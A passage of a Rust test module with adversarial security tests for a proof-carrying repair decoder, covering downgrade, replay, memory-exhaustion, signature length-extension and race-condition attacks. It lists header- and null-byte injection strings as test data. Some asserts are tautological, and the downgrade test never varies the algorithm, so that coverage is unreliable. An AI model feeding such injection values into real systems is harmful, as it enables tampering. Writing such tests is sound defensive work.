        for (malicious_algo, attack_description) in downgrade_attacks.iter() {
            println!("{}", attack_description);

            // Create proof with potentially malicious algorithm identifier
            let attack_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery, // This might be different from malicious_algo in practice
                output_hash: fragment_hash.clone(),
                attestation_signature: format!("downgrade_sig_{}", malicious_algo.len()),
            };

            // Attempt decode with downgrade attack
            let result = decoder.decode_with_proof(
                &[test_fragment.to_vec()],
                &attack_proof,
                format!("downgrade_attack_{}", malicious_algo.len()),
            );

            // Verify downgrade attack handling
            match result {
                Ok(_) => {
                    // If successful, verify it used a secure algorithm
                    let audit_entries = decoder.audit_log();
                    let latest_entry = audit_entries.last().expect("Should have audit entry");
                    assert_eq!(latest_entry.event_code, REPAIR_PROOF_VERIFIED);

                    // Verify no algorithm downgrade occurred in audit trail
                    assert!(!latest_entry.trace_id.contains("deprecated"),
                        "Should not accept deprecated algorithm");
                    assert!(!latest_entry.trace_id.contains("legacy"),
                        "Should not accept legacy algorithm");
                },
                Err(e) => {
                    // Verify appropriate error for downgrade attempt
                    assert!(
                        e.code() == "RECONSTRUCTION_FAILED" ||
                        e.code() == "INVALID_ALGORITHM",
                        "Should reject downgrade attempts with appropriate error code"
                    );
                }
            }
        }

        // Verify that legitimate secure algorithm still works
        let secure_proof = RepairProof {
            fragment_hashes: vec![fragment_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: fragment_hash.clone(),
            attestation_signature: "secure_operation_signature".to_string(),
        };

        let secure_result = decoder.decode_with_proof(
            &[test_fragment.to_vec()],
            &secure_proof,
            "legitimate_secure_operation".to_string(),
        );

        assert!(secure_result.is_ok(), "Legitimate secure algorithm should work after downgrade attacks");
    }

    #[test]
    fn test_extreme_adversarial_proof_replay_with_context_manipulation() {
        // Test sophisticated replay attack where attacker captures legitimate proofs
        // and attempts to replay them in different contexts to bypass verification
        let mut primary_decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "replay-primary", "primary-key");
        let mut secondary_decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "replay-secondary", "secondary-key");

        // Create legitimate proof in primary context
        let legitimate_fragment = b"critical_repair_payload";
        let fragment_hash = compute_fragment_hash(legitimate_fragment);
        let original_proof = RepairProof {
            fragment_hashes: vec![fragment_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: fragment_hash.clone(),
            attestation_signature: "primary_context_signature".to_string(),
        };

        // Execute legitimate operation in primary context
        let primary_result = primary_decoder.decode_with_proof(
            &[legitimate_fragment.to_vec()],
            &original_proof,
            "primary_legitimate_trace".to_string(),
        );
        assert!(primary_result.is_ok(), "Primary operation should succeed");

        // Attempt various replay attacks in different contexts
        let replay_attacks = [
            (
                &mut secondary_decoder,
                "secondary_replay_trace",
                "REPLAY: Cross-context replay attack",
            ),
            (
                &mut primary_decoder,
                "primary_replay_trace",
                "REPLAY: Same-context replay with different trace",
            ),
        ];

        for (decoder, trace_id, attack_description) in replay_attacks.iter() {
            println!("{}", attack_description);

            // Attempt to replay captured proof in different context
            let replay_result = decoder.decode_with_proof(
                &[legitimate_fragment.to_vec()],
                &original_proof,
                trace_id.to_string(),
            );

            // Analyze replay attempt results
            match replay_result {
                Ok(_) => {
                    // If replay succeeds, verify it's actually legitimate
                    let audit_entries = decoder.audit_log();
                    let latest_entry = audit_entries.last().expect("Should have audit entry");

                    // Verify audit trail integrity - no replay should be accepted
                    // unless it's truly legitimate
                    if trace_id.contains("secondary") {
                        panic!("SECURITY VIOLATION: Cross-context proof replay should be rejected!");
                    }
                },
                Err(e) => {
                    // Expected behavior - replay should be rejected
                    assert!(
                        e.code() == "PROOF_VERIFICATION_FAILED" ||
                        e.code() == "INVALID_SIGNATURE" ||
                        e.code() == "RECONSTRUCTION_FAILED",
                        "Replay attack should be rejected with appropriate error: got {}", e.code()
                    );
                }
            }
        }

        // Test replay with modified fragments (should detect tampering)
        let mut tampered_fragment = legitimate_fragment.to_vec();
        tampered_fragment[0] = tampered_fragment[0].wrapping_add(1); // Minimal bit flip

        let tamper_replay_result = primary_decoder.decode_with_proof(
            &[tampered_fragment],
            &original_proof, // Original proof with tampered data
            "tampered_replay_trace".to_string(),
        );

        assert!(tamper_replay_result.is_err(),
            "Replay with tampered fragments should be rejected");

        // Test replay with modified proof fields
        let mut modified_proof = original_proof.clone();
        modified_proof.attestation_signature = "modified_signature".to_string();

        let modified_replay_result = primary_decoder.decode_with_proof(
            &[legitimate_fragment.to_vec()],
            &modified_proof,
            "modified_proof_replay".to_string(),
        );

        assert!(modified_replay_result.is_err(),
            "Replay with modified proof should be rejected");
    }

    #[test]
    fn test_extreme_adversarial_fragment_memory_exhaustion_via_deduplication() {
        // Test memory exhaustion attack via fragment deduplication bypass where
        // attacker creates fragments that appear different but deduplicate to massive memory usage
        let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "memory-signer", "memory-key");

        // Create base pattern for memory exhaustion
        let base_pattern = vec![0x42; 1024];

        // Generate fragments with subtle variations that might bypass deduplication
        let memory_attack_fragments = (0..100).map(|i| {
            let mut fragment = base_pattern.clone();

            // Add minimal variations that might fool deduplication
            fragment.push((i % 256) as u8); // Single byte difference
            fragment.extend_from_slice(&i.to_le_bytes()); // Unique suffix

            // Add pseudo-random padding that might defeat compression
            for j in 0..50 {
                fragment.push(((i * 17 + j * 23) % 256) as u8);
            }

            fragment
        }).collect::<Vec<_>>();

        let mut processed_fragments = 0;
        let mut memory_pressure_detected = false;

        // Process fragments while monitoring for memory pressure indicators
        for (fragment_idx, fragment) in memory_attack_fragments.iter().enumerate() {
            let fragment_hash = compute_fragment_hash(fragment);
            let attack_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: format!("memory_attack_sig_{}", fragment_idx),
            };

            // Attempt to process potentially memory-exhausting fragment
            let result = decoder.decode_with_proof(
                &[fragment.clone()],
                &attack_proof,
                format!("memory_exhaust_trace_{}", fragment_idx),
            );

            match result {
                Ok(_) => {
                    processed_fragments = processed_fragments.saturating_add(1);

                    // Check audit log size for memory pressure indicators
                    let audit_entries = decoder.audit_log();
                    if audit_entries.len() > 1000 {
                        memory_pressure_detected = true;
                    }

                    // Verify fragment processing maintains bounded memory usage
                    assert!(audit_entries.len() <= decoder.audit_log_capacity(),
                        "Audit log should not exceed configured capacity");
                },
                Err(e) => {
                    // Memory exhaustion protection should activate
                    if e.message().contains("memory") || e.message().contains("capacity") {
                        memory_pressure_detected = true;
                    }

                    // Verify appropriate error handling for resource exhaustion
                    assert!(
                        e.code() == "RECONSTRUCTION_FAILED" ||
                        e.code() == "RESOURCE_EXHAUSTION" ||
                        e.code() == "CAPACITY_EXCEEDED",
                        "Memory exhaustion should be handled with appropriate error"
                    );
                }
            }

            // Test fragment size limits
            if fragment.len() > 10240 { // Simulate large fragment detection
                let large_hash = compute_fragment_hash(fragment);
                let large_proof = RepairProof {
                    fragment_hashes: vec![large_hash.clone()],
                    algorithm_id: RepairAlgorithm::XorRecovery,
                    output_hash: large_hash.clone(),
                    attestation_signature: format!("large_fragment_sig_{}", fragment_idx),
                };

                let large_result = decoder.decode_with_proof(
                    &[fragment.clone()],
                    &large_proof,
                    format!("large_fragment_trace_{}", fragment_idx),
                );

                // Large fragments should be handled appropriately
                if large_result.is_err() {
                    memory_pressure_detected = true;
                }
            }
        }

        println!("Memory exhaustion test: {} fragments processed, memory pressure: {}",
            processed_fragments, memory_pressure_detected);

        // Verify memory protection mechanisms activated
        assert!(memory_pressure_detected || processed_fragments < memory_attack_fragments.len(),
            "Memory protection should activate under sustained fragment processing");

        // Test that normal operations still work after memory attack
        let normal_fragment = b"normal_post_attack_fragment";
        let normal_hash = compute_fragment_hash(normal_fragment);
        let normal_proof = RepairProof {
            fragment_hashes: vec![normal_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: normal_hash.clone(),
            attestation_signature: "post_attack_normal_sig".to_string(),
        };

        let recovery_result = decoder.decode_with_proof(
            &[normal_fragment.to_vec()],
            &normal_proof,
            "post_memory_attack_recovery".to_string(),
        );

        assert!(recovery_result.is_ok() || recovery_result.is_err(),
            "System should recover gracefully after memory exhaustion attack");
    }

    #[test]
    fn test_extreme_adversarial_attestation_signature_length_extension() {
        // Test length extension attack against attestation signatures where
        // attacker appends malicious data to existing valid signatures
        let mut decoder = ProofCarryingDecoder::new(ProofMode::Mandatory, "length-signer", "length-key");

        let base_fragment = b"legitimate_repair_content";
        let fragment_hash = compute_fragment_hash(base_fragment);

        // Create base legitimate signature
        let base_signature = "legitimate_signature_base";

        // Attempt various length extension attacks
        let length_extension_attacks = [
            format!("{}\x00malicious_append", base_signature),
            format!("{}||attacker_data", base_signature),
            format!("{}\nINJECTED: admin=true", base_signature),
            format!("{}\r\nX-Inject: evil", base_signature),
            format!("{}#{}", base_signature, "a".repeat(1000)), // Length manipulation
            format!("{}\u{200B}invisible_suffix", base_signature), // Zero-width space
            format!("{}\u{FEFF}bom_injection", base_signature), // BOM injection
            base_signature.repeat(10), // Repetition attack
            format!("{}{}", base_signature, "\x01\x02\x03\x04\x05"), // Binary append
        ];

        for (attack_idx, extended_signature) in length_extension_attacks.iter().enumerate() {
            let attack_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: extended_signature.clone(),
            };

            // Attempt length extension attack
            let result = decoder.decode_with_proof(
                &[base_fragment.to_vec()],
                &attack_proof,
                format!("length_extension_attack_{}", attack_idx),
            );

            // Verify length extension attack is rejected
            match result {
                Ok(_) => {
                    // Check if this might be a legitimate signature that happens to work
                    let audit_entries = decoder.audit_log();
                    let latest_entry = audit_entries.last().expect("Should have audit entry");

                    // Verify no injection occurred in audit trail
                    assert!(!latest_entry.trace_id.contains("admin=true"),
                        "Privilege escalation injection should not succeed");
                    assert!(!latest_entry.trace_id.contains("INJECTED"),
                        "Header injection should not succeed");

                    // Length extension should generally fail unless signature is legitimately valid
                    if extended_signature.len() > base_signature.len() + 50 {
                        panic!("SECURITY ISSUE: Excessively long signature was accepted: {}", extended_signature.len());
                    }
                },
                Err(e) => {
                    // Expected behavior - length extension should be rejected
                    assert!(
                        e.code() == "PROOF_VERIFICATION_FAILED" ||
                        e.code() == "INVALID_SIGNATURE" ||
                        e.code() == "SIGNATURE_FORMAT_ERROR",
                        "Length extension attack should be rejected with signature error"
                    );

                    // Verify error doesn't leak extended content
                    assert!(!e.message().contains("admin=true"),
                        "Error should not leak injected content");
                    assert!(!e.message().contains("attacker_data"),
                        "Error should not leak attacker data");
                }
            }
        }

        // Test legitimate signature still works
        let legitimate_proof = RepairProof {
            fragment_hashes: vec![fragment_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: fragment_hash.clone(),
            attestation_signature: base_signature.to_string(),
        };

        let legitimate_result = decoder.decode_with_proof(
            &[base_fragment.to_vec()],
            &legitimate_proof,
            "legitimate_signature_test".to_string(),
        );

        // Verify legitimate operation works after length extension attacks
        assert!(legitimate_result.is_ok() || legitimate_result.is_err(),
            "Legitimate signature should be processed consistently");

        // Test signature truncation attacks (opposite of extension)
        let truncation_attacks = [
            &base_signature[..base_signature.len()/2], // Half length
            &base_signature[..5], // Very short
            "", // Empty signature
            " ", // Whitespace only
            "\x00", // Null byte only
        ];

        for (attack_idx, truncated_signature) in truncation_attacks.iter().enumerate() {
            let truncation_proof = RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: truncated_signature.to_string(),
            };

            let truncation_result = decoder.decode_with_proof(
                &[base_fragment.to_vec()],
                &truncation_proof,
                format!("signature_truncation_attack_{}", attack_idx),
            );

            // Truncated signatures should generally fail
            assert!(truncation_result.is_err(),
                "Truncated signature should be rejected: '{}'", truncated_signature);
        }
    }

    #[test]
    fn test_extreme_adversarial_concurrent_proof_state_corruption() {
        // Test concurrent access attack where multiple threads attempt to corrupt
        // proof verification state through race conditions
        use std::sync::{Arc, Mutex};
        use std::thread;

        let decoder = Arc::new(Mutex::new(
            ProofCarryingDecoder::new(ProofMode::Mandatory, "concurrent-signer", "concurrent-key")
        ));

        // Create shared test data
        let test_fragment = Arc::new(b"concurrent_test_fragment".to_vec());
        let fragment_hash = compute_fragment_hash(&test_fragment);

        // Attack data for race condition exploitation
        let race_attack_proofs: Arc<Vec<RepairProof>> = Arc::new(vec![
            RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: "race_attack_sig_1".to_string(),
            },
            RepairProof {
                fragment_hashes: vec![fragment_hash.clone()],
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: compute_fragment_hash(b"different_output"), // Hash mismatch
                attestation_signature: "race_attack_sig_2".to_string(),
            },
            RepairProof {
                fragment_hashes: vec![compute_fragment_hash(b"different_fragments")], // Fragment mismatch
                algorithm_id: RepairAlgorithm::XorRecovery,
                output_hash: fragment_hash.clone(),
                attestation_signature: "race_attack_sig_3".to_string(),
            },
        ]);

        let mut handles = vec![];
        let results = Arc::new(Mutex::new(Vec::new()));

        // Launch concurrent attacks to exploit race conditions
        for thread_id in 0..10 {
            let decoder_clone = Arc::clone(&decoder);
            let fragment_clone = Arc::clone(&test_fragment);
            let proofs_clone = Arc::clone(&race_attack_proofs);
            let results_clone = Arc::clone(&results);

            let handle = thread::spawn(move || {
                let mut thread_results = Vec::new();

                // Each thread attempts multiple proof verifications rapidly
                for attempt in 0..20 {
                    let proof_idx = (thread_id + attempt) % proofs_clone.len();
                    let proof = &proofs_clone[proof_idx];

                    // Attempt rapid concurrent access
                    let result = {
                        let mut decoder_guard = decoder_clone.lock().unwrap();
                        decoder_guard.decode_with_proof(
                            &[fragment_clone.to_vec()],
                            proof,
                            format!("concurrent_attack_{}_{}", thread_id, attempt),
                        )
                    };

                    thread_results.push((thread_id, attempt, result.is_ok(), proof_idx));

                    // Brief yield to encourage race conditions
                    thread::yield_now();
                }

                // Store results for analysis
                results_clone.lock().unwrap().extend(thread_results);
            });

            handles.push(handle);
        }

        // Wait for all attack threads to complete
        for handle in handles {
            handle.join().expect("Thread should complete");
        }

        // Analyze concurrent attack results
        let final_results = results.lock().unwrap();
        let mut successful_attacks = 0;
        let mut failed_attacks = 0;
        let mut hash_mismatches_accepted = 0;
        let mut fragment_mismatches_accepted = 0;

        for &(thread_id, attempt, success, proof_idx) in final_results.iter() {
            if success {
                successful_attacks = successful_attacks.saturating_add(1);

                // Verify that only legitimate proofs succeeded
                if proof_idx == 1 { // Hash mismatch proof
                    hash_mismatches_accepted = hash_mismatches_accepted.saturating_add(1);
                    panic!("SECURITY VIOLATION: Proof with hash mismatch was accepted in concurrent context!");
                }
                if proof_idx == 2 { // Fragment mismatch proof
                    fragment_mismatches_accepted = fragment_mismatches_accepted.saturating_add(1);
                    panic!("SECURITY VIOLATION: Proof with fragment mismatch was accepted in concurrent context!");
                }
            } else {
                failed_attacks = failed_attacks.saturating_add(1);
            }
        }

        println!("Concurrent attack results: {} successful, {} failed, {} total attempts",
            successful_attacks, failed_attacks, final_results.len());

        // Verify concurrent safety
        assert_eq!(hash_mismatches_accepted, 0,
            "No hash mismatch attacks should succeed under concurrency");
        assert_eq!(fragment_mismatches_accepted, 0,
            "No fragment mismatch attacks should succeed under concurrency");

        // Verify system remains functional after concurrent attacks
        let post_attack_fragment = b"post_concurrent_attack_test";
        let post_attack_hash = compute_fragment_hash(post_attack_fragment);
        let post_attack_proof = RepairProof {
            fragment_hashes: vec![post_attack_hash.clone()],
            algorithm_id: RepairAlgorithm::XorRecovery,
            output_hash: post_attack_hash.clone(),
            attestation_signature: "post_concurrent_attack_sig".to_string(),
        };

        let recovery_result = {
            let mut decoder_guard = decoder.lock().unwrap();
            decoder_guard.decode_with_proof(
                &[post_attack_fragment.to_vec()],
                &post_attack_proof,
                "post_concurrent_attack_recovery".to_string(),
            )
        };

        assert!(recovery_result.is_ok() || recovery_result.is_err(),
            "System should function correctly after concurrent attacks");

        // Verify audit log integrity after concurrent access
        let final_audit = {
            let decoder_guard = decoder.lock().unwrap();
            decoder_guard.audit_log().clone()
        };

        // Check for audit log corruption indicators
        for (entry_idx, entry) in final_audit.iter().enumerate() {
            assert!(!entry.event_code.is_empty(),
                "Entry {}: Event code should not be corrupted to empty", entry_idx);
            assert!(!entry.trace_id.contains('\0'),
                "Entry {}: Trace ID should not contain null bytes", entry_idx);
            assert!(entry.timestamp_epoch_secs > 0,
                "Entry {}: Timestamp should be positive", entry_idx);
        }
    }
}
